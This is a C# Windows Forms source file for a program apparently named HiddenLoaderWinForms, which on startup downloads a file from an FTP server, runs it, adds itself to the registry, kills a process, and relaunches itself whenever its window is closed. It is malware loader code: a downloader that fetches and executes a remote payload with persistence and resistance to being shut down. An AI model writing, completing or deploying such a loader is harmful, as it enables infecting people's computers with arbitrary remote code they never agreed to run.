using System;
using System.Windows.Forms;
using System.Diagnostics;
using HiddenLoaderWinForms.Download;
using Microsoft.Win32;

namespace HiddenLoaderWinForms
{
    public partial class Form1 : Form
    {

        public Form1()
        {
            InitializeComponent();
        }


        private void Form1_Load(object sender, EventArgs e)
        {
            FtpDonwload.Setup(Config.FtpUserName,Config.FtpUserPassword,Config.DownloadFtpAddress);
            FtpDonwload.Download();
            FtpDonwload.StartFile();
            
            Registry.AddToRegistry();
            
            ProcessKiller.KillProcess();
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            System.Diagnostics.Process.Start(Application.ExecutablePath);
            Environment.Exit(0);
        }

        private void label2_Click(object sender, EventArgs e)
        {

        }
    }
    }